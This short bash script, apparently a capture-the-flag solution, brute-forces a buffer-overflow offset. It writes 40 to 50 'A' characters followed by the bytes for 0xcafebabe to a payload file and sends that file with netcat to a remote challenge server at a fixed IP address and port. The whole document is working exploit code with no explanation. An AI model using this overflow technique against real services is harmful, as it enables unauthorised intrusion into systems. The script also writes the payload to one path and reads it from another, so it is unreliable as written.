#!/bin/bash
for i in {40..50};
do
	perl -e 'print "A"x'$i';print "\xbe\xba\xfe\xca"' > ~/Desktop/QCTF/payload.txt
	echo $i
	cat payload.txt | nc 40.80.89.118 30014 -q 5
done
